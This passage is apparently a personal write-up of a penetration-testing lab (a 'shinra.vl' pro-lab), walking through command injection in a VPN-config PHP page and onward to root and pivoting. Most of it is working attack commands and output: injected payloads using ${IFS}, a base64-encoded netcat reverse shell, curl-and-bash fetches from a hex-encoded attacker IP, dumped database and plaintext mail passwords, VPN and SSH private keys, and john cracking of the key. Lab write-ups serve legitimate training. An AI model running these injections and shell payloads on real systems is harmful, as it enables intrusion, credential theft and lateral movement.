          <li class="nav-item">
            <a class="nav-link isDisabled" href="?page=admin" >
              <span data-feather="shopping-cart" class="align-text-bottom"></span>
              Admin
            </a>
          </li>      
        </ul>
      </div>
    </nav>

    <main class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
      <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pb-2 mb-3 text-center"> 
      </div>
      <div>
        <!-- Content -->
        <?php 
        if (isset($_GET["page"])){
          if ($_GET["page"] == "vpn"){
            include("partials/vpn.php");
          }
          if ($_GET["page"] == "status"){
            include("partials/status.php");
          }
          if ($_GET["page"] == "account"){
            include("partials/account.php");
          }
          if ($_GET["page"] == "admin"){
            header('Location: /dashboard.php');
            // Disabled              
          }
        }
        ?>
      </div>   
    </main>
  </div>
</div>

<script src="js/jquery-3.6.1.min.js"></script>
<script src="js/feather.min.js"></script>
</body>
</html>
```

Now a quick ls shows more:

```bash
//Request
user01;ls${IFS}/var/www/html/


//Response
    /var/www/html/dashboard.php
/var/www/html/index.php
/var/www/html/logout.php

/var/www/html/backup:
db.tgz

/var/www/html/css:
bootstrap.min.css
dashboard.css
home.css

/var/www/html/db:
migrations.sql
vpn.db

/var/www/html/images:
logo.png

/var/www/html/js:
feather.min.js
jquery-3.6.1.min.js

/var/www/html/mail:
CHANGELOG.md
INSTALL
LICENSE
README.md
SECURITY.md
SQL
UPGRADING
bin
composer.json
composer.json-dist
composer.lock
config
index.php
installer_to_be_removed
logs
plugins
program
public_html
skins
temp
vendor

/var/www/html/partials:
account.php
status.php
vpn.php

```

Now since my goal is to get a RCE and this is easier done here than on Roundcude I will obtain the vpn code that is creating this VPN from the **partials** folder:

```php
    <?php
$vpn = "Error";
if(array_key_exists('action', $_GET)) {
    $safe = str_replace("@","_",$displayname);
    $safe = str_replace(".","_",$safe);
    $cmd = 'bash /opt/vpn/new_client.sh $(echo '.$safe.');';
    //echo $cmd;
    $output = shell_exec($cmd);
    //echo $output;
    echo '<!-- Saved as /opt/vpn/'.$safe.'.ovpn -->';
    $cmd = 'cat /opt/vpn/'.$safe.'*';
    //echo $cmd;
    $output = shell_exec($cmd);
    //echo $output;
    $sql = "UPDATE users SET vpn = :vpn WHERE username = :name";
    try {
        $statement = $db->prepare($sql);
        $statement->execute(array('name' => $username, 'vpn' => $output));
    }
    catch(PDOException $e) {
        echo "<!-- Something went wrong: ".$e->getMessage()." -->";
    }
}
$sql = "SELECT * FROM users WHERE username = :name";
try {
    $statement = $db->prepare($sql);
    $statement->execute(array('name' => $username));
    $row = $statement->fetch();
    if ($row) {        
        $vpn = $row['vpn'];  
    }
}
catch(PDOException $e) {
    echo "<!-- Something went wrong: ".$e->getMessage()." -->";
}
?>

<h3 class="h3">VPN</h3>

<br/>
<textarea id="config" name="config" rows="20" cols="80">
    <?php echo $vpn ?>

```

Now here I am trying to get a RCE but the dots can't be bypassed and the base64 seems not invoked? So I am using this to read the roundcube emails config:

```bash
//Command
user01;cat${IFS}/var/www/html/mail/config/config*inc*

//Partial config page
<?php

/* Local configuration for Roundcube Webmail */

// ----------------------------------
// SQL DATABASE
// ----------------------------------
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see   http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// Note: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
// Note: Various drivers support various additional arguments for connection,
//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
//       for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service.
//       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
$config['db_dsnw'] = 'mysql://rcadmin:w8W%40qXcU%21H%5EVh8Jc@localhost/roundcube';

// ----------------------------------
// IMAP
```

Now these credentials unfortunately are only on MYSQL side and don't work here. Now checking the logs I can see traces of 2 users only?

```bash
[09-Dec-2022 08:22:16 +0000]: <4r4l0mtl> User ashleigh.lewis@shinra.vl [10.8.0.2]; Message <7ab3bd4ef98d4fec425825a4e411ebf7@shinra.vl> for ashleigh.lewis@shinra.vl; 250: 2.0.0 Ok: queued as D6D3127B16
[26-Dec-2022 06:44:58 +0000]: <7oslrr6j> User charlotte.newton@shinra.vl [10.8.0.2]; Message <f6f0450c265229eef342c000b73a3e49@shinra.vl> for ashleigh.lewis@shinra.vl; 250: 2.0.0 Ok: queued as 746C527B5D
[26-Dec-2022 06:46:23 +0000]: <639e57g3> User ashleigh.lewis@shinra.vl [10.8.0.2]; Message <36ab9c04f14bf96c3405f026ed910334@shinra.vl> for william.davis@shinra.vl; 250: 2.0.0 Ok: queued as 11D9B27B59
[26-Dec-2022 06:47:46 +0000]: <5lsft0q8> User william.davis@shinra.vl [10.8.0.2]; Message <fa6e05833c6855f7851352a0632176ee@shinra.vl> for ashleigh.lewis@shinra.vl; 250: 2.0.0 Ok: queued as F144E27B6E
[26-Dec-2022 06:50:39 +0000]: <5lsft0q8> User william.davis@shinra.vl [10.8.0.2]; Message <dceeb97e99fac89d3335e9aa88362829@shinra.vl> for ashleigh.lewis@shinra.vl; 250: 2.0.0 Ok: queued as AB11827B16
[26-Dec-2022 06:54:16 +0000]: <mrqm97k6> User ashleigh.lewis@shinra.vl [10.8.0.2]; Message <5dbfaaa7c49b93a62dcf5052d24c3d25@shinra.vl> for william.davis@shinra.vl; 250: 2.0.0 Ok: queued as 7892827B16
```

Now I am trying another theory:

```bash
//Write the B64 encoded shell to a text file
user01;echo${IFS}'bmMgMTAuMTAuMTQuMjAgNDQ0NCAtZSAvYmluL2Jhc2g='>>/tmp/shell

//Check it
user01;ls${IFS}/tmp

//Unbase 64 it
user01;base64${IFS}-d${IFS}/tmp/shell64>/tmp/shelly

//Check it
user01;ls${IFS}/tmp/

//Chmod it
user01;chmod${IFS}+x${IFS}/tmp/shelly

//Execute it
user01;bash${IFS}/tmp/shelly
```

![040cc64e8709cdd2d8a1d4cb259b7eb4.png](../../../_resources/040cc64e8709cdd2d8a1d4cb259b7eb4.png)

![13f32946d2a26192cd1a7537ea269f5e.png](../../../_resources/13f32946d2a26192cd1a7537ea269f5e.png)

![0c36c093b4819b3e9a1ec50c2e0a90b7.png](../../../_resources/0c36c093b4819b3e9a1ec50c2e0a90b7.png)

But it did not work so I saved another shell in a file I host and I fired this:

```bash
user01;$(curl${IFS}http://0x0a0a0e14/shellsh|bash)${IFS}
```

And I see a callback but the pipe is cleaned?  
![bd61156982dc93765500ab3a934186be.png](../../../_resources/bd61156982dc93765500ab3a934186be.png)

But finally I made it:

```bash
//Downloading my shello locally to victim, use the hex encoding for the IP
user01;curl${IFS}http://0x0a0a0e14/shell${IFS}-o${IFS}/tmp/merda

//kicking it
user01;bash${IFS}/tmp/merda
```

![65243883d28d8397fcd583964e20a4c6.png](../../../_resources/65243883d28d8397fcd583964e20a4c6.png)

# The first foothold

Now I can see the possible VPN for pivoting?

```bash
www-data@web01:/opt/vpn$ cat client.ovpn
cat client.ovpn
client
dev tun
proto udp
remote 172.16.10.20 1194
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
auth SHA512
cipher AES-256-CBC
ignore-unknown-option block-outside-dns
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIDSzCCAjOgAwIBAgIUCWy5USB3dQJNTrig7D8Ln2Zigc0wDQYJKoZIhvcNAQEL
BQAwFjEUMBIGA1UEAwwLRWFzeS1SU0EgQ0EwHhcNMjIxMjA4MTUxMTEzWhcNMzIx
MjA1MTUxMTEzWjAWMRQwEgYDVQQDDAtFYXN5LVJTQSBDQTCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBALj2msqXd2YU0rQ7/1x+zklWJ+NKgtPJpLymi747
wXvs0jcTrVYifk1TUpxC40VFFmQjNxJMhnccLMg6UFfn+Ji4jzcAvyNnxQM0OjVb
i52wL9PWllGK1T6o0m8wFh91o5yADk2apIidhnKFXHTn9Psc+CMnE2Q+2xyyMDoe
8ICmA6kj8AJ6zNvFZpddRUWDYH04MkyYmC0Jbei/Q0WHzBFQysaDlbcoZb3IyghN
VFsyN06Ij3TdWzFyoQoW38aCZMjleQaAGXlr8Kggn5cy2WCI5RV7JTRJ/JVfeJ1w
lh4doIycG1NdByN9ZABBPm3luwRWnodkjY9iRJDQKlE23vkCAwEAAaOBkDCBjTAM
BgNVHRMEBTADAQH/MB0GA1UdDgQWBBQWoUcN252Uul9TuxrYOfZB54qqDjBRBgNV
HSMESjBIgBQWoUcN252Uul9TuxrYOfZB54qqDqEapBgwFjEUMBIGA1UEAwwLRWFz
eS1SU0EgQ0GCFAlsuVEgd3UCTU64oOw/C59mYoHNMAsGA1UdDwQEAwIBBjANBgkq
hkiG9w0BAQsFAAOCAQEAmcOzjEqgfZJf4E1t5atbKKmA/bGLb6W1rV74mS2HYwb3
c6mFuHonKXAPY/lIL8T1Dm+tZ+OzeJgm90Q+z+xZqMZLl4TAvZxr0YTpJEbc4dNn
pAtoDD4DJIH2TwR8PC9McMSrUhYDnzgr69sLLBhmw58wrCsacm2SUxkWQO4auZL3
l4j/S7K75sdyFj4VEqK3HgXo3/8eFHh40qsDsNOqOwuvRNVDFFofzeI2JGl/0t+E
LaDD8f8QXmAhP7vxVMjX207311SWndwBLqUM7wqylG/fHr8zl2Ilt8QMxxCQAO0H
5NKVtzk9vyWISUY8+0N3Bh8oQ2TyuqrYdQ+xVXwpIw==
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIDVTCCAj2gAwIBAgIRAPnlprGwA5qk3mx27RR4K/wwDQYJKoZIhvcNAQELBQAw
FjEUMBIGA1UEAwwLRWFzeS1SU0EgQ0EwHhcNMjIxMjA4MTUxMTEzWhcNMzIxMjA1
MTUxMTEzWjARMQ8wDQYDVQQDDAZjbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDYZpp388IKzRp3SLC6emm5cVEgaiZn3FYyxzuYKUFnzDIu/3jM
N2Irgmx9mlfPm7xxDpE28VqgkZYlUvtanv74t1E9BZmODPERR2I2zeplgVHul67Z
YDFRrA8+upMj4ZnmN8Uq0Uy53SaE/AlhUQXJK5C3DlrQOE7HqVnjHYzmDDSUZcvA
N4pWiC0dIX+VaKx3bjuFFoVaJS1jB4L8546b/0GoK3brPoi0TP8tP0quXPh109Kz
BQOV55UcQquLZur+iaoNPSyuPwujOUNdjHv+Ch7VHaz2PkZytWo6+6+Urrmjhtui
ug41A9eYjdZ/N+2gfDgr9NDiuYyJyRac9FbtAgMBAAGjgaIwgZ8wCQYDVR0TBAIw
ADAdBgNVHQ4EFgQUMeZXZsJJc0EgvxNC8WwO1TT6dHcwUQYDVR0jBEowSIAUFqFH
DdudlLpfU7sa2Dn2QeeKqg6hGqQYMBYxFDASBgNVBAMMC0Vhc3ktUlNBIENBghQJ
bLlRIHd1Ak1OuKDsPwufZmKBzTATBgNVHSUEDDAKBggrBgEFBQcDAjALBgNVHQ8E
BAMCB4AwDQYJKoZIhvcNAQELBQADggEBAEkX6AUrNj7SZI3jRCDGGgNeDxF/R649
fql/4NGdphnNL67rrBoYcW10D/4N9E5gc/HSereia/1QZpVfE8FwyNpoWkbqNCvw
Y3r8s9gki0Er5EOeUuMsDXv08d2hZupRZyqS0VjQ7VDvNYw+LTCJgjYsq9IAiUQP
7latExim9TmJoAIJ5llthqyRO4dTnm7tx16j8B+7DJCC3H0icu5kSL04+YMdzlkk
7D4p1zB9ZqQI4x67ClDwiONBdqxLhYFxUPwgwrT7ef7DX17qtLTzUjg0XfoHr1MO
smihwXAYdYV059e6/DTqgoZqswgmhRkELy5bFsxVuurwH3jMATPrs3g=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDYZpp388IKzRp3
SLC6emm5cVEgaiZn3FYyxzuYKUFnzDIu/3jMN2Irgmx9mlfPm7xxDpE28VqgkZYl
Uvtanv74t1E9BZmODPERR2I2zeplgVHul67ZYDFRrA8+upMj4ZnmN8Uq0Uy53SaE
/AlhUQXJK5C3DlrQOE7HqVnjHYzmDDSUZcvAN4pWiC0dIX+VaKx3bjuFFoVaJS1j
B4L8546b/0GoK3brPoi0TP8tP0quXPh109KzBQOV55UcQquLZur+iaoNPSyuPwuj
OUNdjHv+Ch7VHaz2PkZytWo6+6+Urrmjhtuiug41A9eYjdZ/N+2gfDgr9NDiuYyJ
yRac9FbtAgMBAAECggEAWElH9O9Ad6qlBQxlebbugkc+a2STRaVJj47j+9i9A+11
feIhdOOVjB26SGYbNCqb714blZhTOpYa9SBNRvP+HxefL6+kraUPBtciNSy+V+oy
NI6yuaG6jVEOqS9yT12/rYKMUMMyM9QLXo76/raRDzlUYbKcDz4hueiYMQYB0Wph
soNL8ArDYdvI0WvdM8f8P/Ig8aEorQ+Zv1cVN2CCfr/k4DxZz7OSqva9zhn+oNA5
cWHDKC/rV3sSu64E/5m59THJj/p9bbnhfSGwI8fHcIv0ihR1Ea7oHZjmqWP3qnZg
2VRfZtpv+Gw5m48eRoo8QJTHUYUXluAcN1z/4byE2wKBgQDZZN95dYH1tDcgf6aC
F44APS3iEoVrMBJCJ3kdsNrid4njIwUzLQI04PnAdyovorg5BYokj6nbi+b9Sqc6
v1qSuygluxCGUT4JFFTPa9fzNzbGkHaGaGVLmmmOxuuLAWcKt7kE29qOX2ISkPoR
6xDmvhK3bxUX7Nq9AfYBU7n3uwKBgQD+1JNwZ8fSJQqWncBmXEd34Rbg0xxow8Cs
2GdUttx4cmRIPl9BvJqzTrkbMO0SemOiLX+ak+eGKa47BkFcgx8Sc3UPlxFVoh1w
ioZSnsQsF3uUJa3ih70+iEMpOsW7y/TMTbAB11Gjs8FWMkv5fbWlmB4zKqR0cy4t
nEr7rTYddwKBgQDNCasM75unllX4PO1a/cRczVcdRsK3mhteccR2EHwh5QUUSc95
uRW/sgFdWgdb7mk6vtLQMP/PpmAyvdqEOj6+7e6rx4eKZ83O2nIzQE/pgUYUeeSQ
WJ5RdE3i8BLwhF4fabEDuCim56ekQ0DY7ZB/UP5uLEME0cxtQBA6qDFaSQKBgE+O
NellvPBSOBgFb8eFD5rRXr8ZqUjbtA9CECBWZkYEEGKtdjejlfhcn1Vp1Nlr9Cbx
ZWDww9sSsB4lOcqT9ONhwC35z6OYVPCJjp3EiyHowt/hU4PhNKeNCsqYWprida5C
oqwweIBO4hDy6t0c7dSgxOzcZzMjskry/EXOMZLJAoGAfRHtPl9CDtEkFIMWJ7bP
XeGgC4zWv1Ce2sJ8kkGj/Vze3S4g0SQxeJVS3sHWrhlRr08kbgcrgmR7UWsXNqlo
2S4ZKUa/CEtqL5Xyh7NyWvrLfHMhRBV2KuARHNrmP9nDze6kKzsqMInYo0JhkiK9
Mq+HZIrd7AdVXETFVAOzgcM=
-----END PRIVATE KEY-----
</key>
<tls-crypt>
-----BEGIN OpenVPN Static key V1-----
b51b12eaae6e76fa7f54b364ce93bf9a
7a318a78b973b7190b02a35fb616927c
0fecf07bd74ebaa47ddd71676c44d042
d5ae6974de499a2ea7d42c708b21ba99
acaa9003e84d0a635757a750d306df7b
afe20bdb923c45a95e18f5762a810270
7a503b4e5cd0a09402665913bdbb8010
7b2baeb4f91a0e0df8d2cf6f611e0f3d
fe22078b39eeaad5af4926c59e0e55b4
699e0149ad34e757aad75ceda43cd713
30215f9cb5b417ced90e368d78105117
e5100dd86e95b3eb92098e39ebb3e1d1
af9fefee63447772908d0625bb1eaa66
521e971996f88c5473801f6a9d2d8449
9ed25295d472678d1a68217df625fb2b
eb9f89212f72725c5f73d594be663709
-----END OpenVPN Static key V1-----

```

The next subnet is laying on the 172.16.11.0/24 I will setup Ligolo-NG on the side for the pivoting.

```bash
ww-data@web01:/opt/vpn$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:76:e9 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.110.20/24 brd 10.10.110.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe94:76e9/64 scope global dynamic mngtmpaddr 
       valid_lft 86393sec preferred_lft 14393sec
    inet6 fe80::250:56ff:fe94:76e9/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:94:bd brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    altname ens192
    inet 172.16.11.20/24 brd 172.16.11.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:94bd/64 scope link 
       valid_lft forever preferred_lft forever
www-data@web01:/opt/vpn$ 

```

These are the alive hosts on the .11 network:

```bash
└─$ fping -asqg 172.16.11.0/24
172.16.11.10
172.16.11.11
172.16.11.13
172.16.11.25
172.16.11.50
172.16.11.70
172.16.11.71
172.16.11.101

     254 targets
       8 alive
     245 unreachable
       0 unknown addresses

     980 timeouts (waiting for response)
     989 ICMP Echos sent
       9 ICMP Echo Replies received
       0 other ICMP received

 24.2 ms (min round trip time)
 25.5 ms (avg round trip time)
 29.2 ms (max round trip time)
        9.513 sec (elapsed real time)

```

But before that I need to obtain either setup or root for a persistence, and I will use those credentials obtained by roundcube to connect to the MYSQL database:

```sql
www-data@web01:/$ mysql -u rcadmin -p'w8W@qXcU!H^Vh8Jc' -h localhost roundcube
<rcadmin -p'w8W@qXcU!H^Vh8Jc' -h localhost roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.6.21-MariaDB-0ubuntu0.22.04.2 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> show tables;
show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.000 sec)

```

And these are the users:

```sql
MariaDB [roundcube]> select * from users;
select * from users;
+---------+----------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
| user_id | username                   | mail_host | created             | last_login          | failed_login | failed_login_counter | language | preferences                                       |
+---------+----------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
|       1 | user01@shinra.vl           | localhost | 2022-12-08 16:20:14 | 2022-12-08 16:26:25 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"ShKSpOEyAyg3Q2Te";} |
|       2 | ashleigh.lewis@shinra.vl   | localhost | 2022-12-09 07:17:09 | 2022-12-27 16:26:21 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"AAUZqST24zRfbh3L";} |
|       3 | charlotte.newton@shinra.vl | localhost | 2022-12-26 06:43:45 | 2022-12-26 06:43:45 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"xVIrHElp9RitVCIH";} |
|       4 | william.davis@shinra.vl    | localhost | 2022-12-26 06:46:51 | 2022-12-26 06:46:51 | NULL         |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"bVYEMLJ0A0sFfTkM";} |
+---------+----------------------------+-----------+---------------------+---------------------+--------------+----------------------+----------+---------------------------------------------------+
4 rows in set (0.000 sec)

MariaDB [roundcube]> 
```

Now here the isssue is that neither the password nor the email are saved in this DB but it is still possible to spoof the PHPSESSID cookie and bypass the login phase, I want to see if I can gather some credentials in the email.

```sql
riaDB [roundcube]> select sess_id,ip from session;
select sess_id,ip from session;
+----------------------------+-------------+
| sess_id                    | ip          |
+----------------------------+-------------+
| 4r4l0mtlrikg7tdlo02pc49rea | 10.8.0.2    |
| 6qh1jiod6ekql03102pps8g2dh | 10.10.14.20 |
| cf9sark8ua5oq6jqco3u01j237 | 10.10.16.3  |
| d8ehcmhorv51dso2blleog97ej | 10.10.14.20 |
| er4d791hsqbv6f3uhske6003e5 | 10.8.0.2    |
| mrqm97k680pl4nudl5v5aq5381 | 10.8.0.2    |
| vobcf75grf0k58ri0sqf4139no | 10.10.14.20 |
+----------------------------+-------------+
7 rows in set (0.000 sec)

MariaDB [roundcube]> 

```

Now looking here, seems like there is a authenticated RCE?

![3462b83ca18eb7ae1f5640b6b7d19d8d.png](../../../_resources/3462b83ca18eb7ae1f5640b6b7d19d8d.png)

From the changelog I can see that it might just work?

![f93ba52ac6184ca569ea69b169353571.png](../../../_resources/f93ba52ac6184ca569ea69b169353571.png)

now here I almost missed it but Linpeas flagged presence of dovecot users in plaintext?  
![86e9b5e03798aab939430380fffa2d32.png](../../../_resources/86e9b5e03798aab939430380fffa2d32.png)

And I have what I need to move forward:

```bash
www-data@web01:/etc/dovecot$ cat dovecot-users
cat dovecot-users
adm@shinra.vl:{plain}Shinra2022
victor.davis@shinra.vl:{plain}Gg2HNLJQ!$vC
ashleigh.lewis@shinra.vl:{plain}ay8$GA3R*^ZD
amy.hopkins@shinra.vl:{plain}f4Yzs5HJVz#Q
william.davis@shinra.vl:{plain}Eniwy7j5KH+oze
charlotte.newton@shinra.vl:{plain}ey9ZUa$ioCST
lynda.parry@shinra.vl:{plain}lynda1987
```

And I have it now  
![2c47062660dd1f2209a3c26e99d82af1.png](../../../_resources/2c47062660dd1f2209a3c26e99d82af1.png)

I will use this to obtain a shell as root(hopefully):

```bash
https://github.com/BiiTts/Roundcube-CVE-2025-49113
```

Now the issue is that even this shell is running as www-data which means I cant do it! back to drawing table. Now seems like William send a ID SSH key?

![48fe0d4ae4e0f7a6fcf789ba9664863a.png](../../../_resources/48fe0d4ae4e0f7a6fcf789ba9664863a.png)

The mail tells exactly that the key is crypted so I asked AI to generate a password list of the Shrinra+year and got a match:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
q18BYw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
└─$ john id_rsa.hash --wordlist=default.creds                      
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Shinra2023       (id_rsa)     
1g 0:00:00:01 DONE (2026-03-20 14:25) 0.9615g/s 50.96p/s 50.96c/s 50.96C/s Shinra..Sh1nr42022
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

And I am in as root!

![2ce13808db2939134e36e4cc667563ea.png](../../../_resources/2ce13808db2939134e36e4cc667563ea.png)

And I have the flag!

```bash
root@web01:~# cat flag.txt 
SHINRA{ff90202a8954140da0e9977a0c892cfb}
root@web01:~#
```

# Pivoting

Now I uploaded and setup Ligolo-ng and appured that these devices might be online

```bash
oot@web01:/tmp# for i in {1..254}; do ping -c 1 -W 1 172.16.11.$i | grep "from" && echo "172.16.11.$i is UP"; done
64 bytes from 172.16.11.10: icmp_seq=1 ttl=128 time=0.587 ms
172.16.11.10 is UP
64 bytes from 172.16.11.11: icmp_seq=1 ttl=64 time=0.464 ms
172.16.11.11 is UP
64 bytes from 172.16.11.13: icmp_seq=1 ttl=128 time=0.662 ms
172.16.11.13 is UP
64 bytes from 172.16.11.20: icmp_seq=1 ttl=64 time=0.034 ms
172.16.11.20 is UP
64 bytes from 172.16.11.25: icmp_seq=1 ttl=64 time=0.354 ms
172.16.11.25 is UP
64 bytes from 172.16.11.50: icmp_seq=1 ttl=128 time=0.563 ms
172.16.11.50 is UP
64 bytes from 172.16.11.70: icmp_seq=1 ttl=64 time=0.252 ms
172.16.11.70 is UP
64 bytes from 172.16.11.71: icmp_seq=1 ttl=64 time=0.449 ms
172.16.11.71 is UP
64 bytes from 172.16.11.101: icmp_seq=1 ttl=128 time=0.556 ms
172.16.11.101 is UP

```

And for(me) I will copy these hostnames for the local hosts file:

```bash
#Prolabs
10.10.110.20	web01.shinra.vl
